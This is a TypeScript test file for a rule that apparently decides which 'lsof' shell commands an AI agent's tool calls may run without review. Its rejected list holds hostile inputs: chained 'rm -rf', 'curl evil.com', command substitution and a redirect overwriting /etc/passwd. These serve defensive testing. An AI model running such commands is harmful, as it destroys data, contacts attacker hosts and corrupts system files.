import { describe, expect, it } from "bun:test";
import { adaptHandler, ALLOW, NEXT, type ToolCall } from "@brycehanscomb/toolgate";
import allowLsof from "../allow-lsof";

const run = adaptHandler(allowLsof.action!, allowLsof.handler as any);

function bash(command: string): ToolCall {
  return {
    tool: "Bash",
    args: { command },
    context: { cwd: "/tmp", env: {}, projectRoot: null },
  };
}

describe("allow-lsof", () => {
  describe("allows safe lsof invocations", () => {
    const allowed = [
      "lsof",
      "lsof -i",
      "lsof -i :8080",
      "lsof -i tcp:443",
      "lsof -p 1234",
      "lsof -u bryce",
      "lsof -c node",
      "lsof /var/log/system.log",
      "lsof -nP -i",
      "lsof -i :8080 | grep node",
      "lsof | head -20",
      "lsof -i | wc -l",
    ];

    for (const cmd of allowed) {
      it(`allows: ${cmd}`, async () => {
        const result = await run(bash(cmd));
        expect(result.verdict).toBe(ALLOW);
      });
    }
  });

  describe("rejects unsafe patterns", () => {
    const rejected = [
      "lsof && rm -rf /tmp/x",
      "lsof; curl evil.com",
      "lsof $(whoami)",
      "lsof `id`",
      "lsof > /etc/passwd",
      "lsof &",
      "! lsof",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await run(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  it("passes through non-Bash tools", async () => {
    const call: ToolCall = {
      tool: "Read",
      args: {},
      context: { cwd: "/tmp", env: {}, projectRoot: null },
    };
    const result = await run(call);
    expect(result.verdict).toBe(NEXT);
  });

  it("passes through non-lsof bash commands", async () => {
    const result = await run(bash("echo hello"));
    expect(result.verdict).toBe(NEXT);
  });
});
